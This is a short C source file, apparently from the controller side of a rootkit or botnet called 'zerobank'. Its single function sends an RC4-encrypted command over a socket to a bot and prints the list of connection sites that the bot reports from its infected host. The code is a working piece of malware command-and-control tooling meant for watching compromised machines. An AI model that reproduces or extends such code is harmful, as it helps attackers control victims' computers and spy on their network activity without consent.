#include "server_globals.h"

BOOLEAN rootkit_get_bot_connections(IN SOCKET sock, IN BYTE PacketType)
{
	INT sendsize = 0;
	INT recvsize = 0;
	ZEROBANK_PACKET_TYPE Packet = { 0 };
	PZEROBANK_FILTER_CONNECTION_REQUESTS buffer = NULL;
	PZEROBANK_FILTER_CONNECTION_REQUESTS entrybuffer = NULL;
	BOOL g_cond = FALSE;
	PVOID Out = NULL;
	PVOID Alloc = NULL;
	ULONG getsize = 0;
	ULONG NumberOfConnections = 0;


	char *time = "Time-Stamp";
	char *infobuffer = "Bot connection sites";

	Packet.PacketType = PacketType;

	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&Packet, sizeof(ZEROBANK_PACKET_TYPE));
	if (sendsize > 0)
	{
		recvsize = recv(sock, (PCHAR)&getsize, sizeof(ULONG), 0);
		if (recvsize > 0 && getsize > 0)
		{
			Out = recv_decrypted(sock, RC4_KEY_2, (PZEROBANK_FILTER_CONNECTION_REQUESTS)buffer, getsize);
			if (Out)
			{
				NumberOfConnections = getsize / sizeof(ZEROBANK_FILTER_CONNECTION_REQUESTS);

				entrybuffer = (PZEROBANK_FILTER_CONNECTION_REQUESTS)Out;

				printf("\r\n");
				printf("\r\n%15s %30s", time, infobuffer);
				printf("\r\n");

				for (ULONG i = 0; i < NumberOfConnections; i++, entrybuffer++)
				{
					printf("%s", entrybuffer->ShareData);
					g_cond = TRUE;
				}
				RtlFreeHeap(GetProcessHeap(), 0, Out);
				Out = NULL;
			}
		}
	}

	return g_cond;
}
